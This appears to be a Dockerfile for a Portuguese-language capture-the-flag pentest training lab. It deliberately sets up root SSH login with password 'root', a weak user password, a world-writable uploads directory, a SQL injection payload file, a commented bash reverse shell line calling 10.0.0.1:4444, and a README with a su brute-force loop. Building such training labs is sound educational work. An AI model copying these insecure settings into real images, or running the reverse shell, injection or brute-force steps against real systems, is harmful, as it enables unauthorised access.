FROM debian:12-slim

LABEL maintainer="CTF SENAI" description="Cenário Pentest - 5 Desafios"

# Instalar apenas ferramentas essenciais
RUN apt-get update && apt-get install -y --no-install-recommends \
    openssh-server python3 netcat-openbsd nmap file apache2 sudo binutils wget ca-certificates \
    && apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# SSH config
RUN mkdir -p /var/run/sshd && echo 'root:root' | chpasswd \
    && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Criar usuário padrão (não-privilegiado) para o terminal
RUN useradd -m -s /bin/bash user && echo 'user:user' | chpasswd

# Criar usuário vulnerável com senha fraca do rockyou.txt (posição 350)
RUN useradd -m -s /bin/bash ctfuser && echo 'ctfuser:jordan23' | chpasswd

# Criar todos os desafios
RUN mkdir -p /root/pentest /var/www/html/uploads \
    && echo "W34K_P4SSW0RD" > /home/ctfuser/flag.txt && chown ctfuser:ctfuser /home/ctfuser/flag.txt && chmod 600 /home/ctfuser/flag.txt \
    && echo "P0RT_SC4NN3R" > /root/pentest/scan_flag.txt \
    && chmod 777 /var/www/html/uploads && echo "UPL04D_VULN" > /var/www/html/uploads/flag.txt \
    && echo "' OR '1'='1" > /root/pentest/sqli_payload.txt && echo "SQL1_M4ST3R" > /root/pentest/sqli_flag.txt \
    && printf '#!/bin/bash\n# Reverse Shell Example\n# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n# Flag: R3V3RS3_SH3LL\n' > /root/pentest/revshell.sh \
    && chmod +x /root/pentest/revshell.sh && echo "R3V3RS3_SH3LL" > /root/pentest/revshell_flag.txt

# Criar README com instruções para wordlist
RUN printf '\n=== CYBERSKILLS LAB - PENTEST ===\n\n5 desafios de penetration testing\n\n=== DESAFIO 1: Weak Password ===\n\nO usuário ctfuser tem uma senha fraca presente na wordlist rockyou.txt.\n\nPara resolver:\n\n1. Baixe a wordlist (top-1000 do rockyou.txt):\n\n   wget https://raw.githubusercontent.com/Jhow-Magnum/cyberskills-lab/main/wordlist.txt\n\n2. Use brute force automatizado:\n\n   while read senha; do echo "Testando: $senha"; echo $senha | su ctfuser -c "cat /home/ctfuser/flag.txt" 2>/dev/null && break; done < wordlist.txt\n\n3. Ou teste manualmente após analisar a wordlist:\n\n   cat wordlist.txt | head -20\n   su ctfuser\n   cat flag.txt\n\nDica: A senha está entre as top-500 senhas mais comuns.\n\n' > /home/user/README.txt \
    && chown user:user /home/user/README.txt

# Script de inicialização
RUN printf '#!/bin/bash\nservice apache2 start\n/usr/sbin/sshd -D\n' > /start.sh && chmod +x /start.sh

EXPOSE 22 80
CMD ["/start.sh"]
